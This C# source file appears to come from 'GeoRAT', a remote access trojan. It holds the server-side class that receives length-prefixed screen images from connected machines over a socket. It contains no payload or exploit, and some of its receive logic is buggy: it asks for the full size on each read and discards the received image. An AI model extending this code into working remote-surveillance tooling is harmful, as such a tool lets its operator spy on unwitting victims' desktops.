using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace GeoRAT.Server.Core
{ 
    internal class RemoteDesktopHandler
    {
        private readonly byte[] _buffer = new byte[4];
        private readonly Socket _desktopReceiver;
        public delegate void Disconnected(Socket s);
        public event Disconnected OndDisconnected;


        public RemoteDesktopHandler(Socket desktopReceiver)
        {
            _desktopReceiver = desktopReceiver;
        }

        internal void Start()
        {
            _desktopReceiver.BeginReceive(_buffer, 0, 4, SocketFlags.None, ReceivedCallback, null);

        }
        private void ReceivedCallback(IAsyncResult result)
        {
            try
            {
                var total = _desktopReceiver.EndReceive(result);
                var left = sizeof(int) - total;
                do
                {
                    var recv = _desktopReceiver.Receive(_buffer, total, left, SocketFlags.None);
                    left -= recv;
                } while (left != 0);
                ReceiveImage(BitConverter.ToInt32(_buffer,0));
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "An Error occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
                OndDisconnected?.Invoke(_desktopReceiver);
            }
            
        }

        internal byte[] ReceiveImage(int size = 0) 
        {
            try
            {
                var total = 0;
                byte[] buffer = new byte[size];
                do
                {
                    IAsyncResult result = _desktopReceiver.BeginReceive(buffer, total, size, SocketFlags.None, null, null);
                    result.AsyncWaitHandle.WaitOne(_desktopReceiver.ReceiveTimeout);
                    int received = _desktopReceiver.EndReceive(result);
                    total += received;
                    if (received == 0)
                        break;
                } while (total < size);
                return buffer;

            }
            catch
            {

                OndDisconnected?.Invoke(_desktopReceiver);
            }
            return new byte[]{};
        }
    }
}
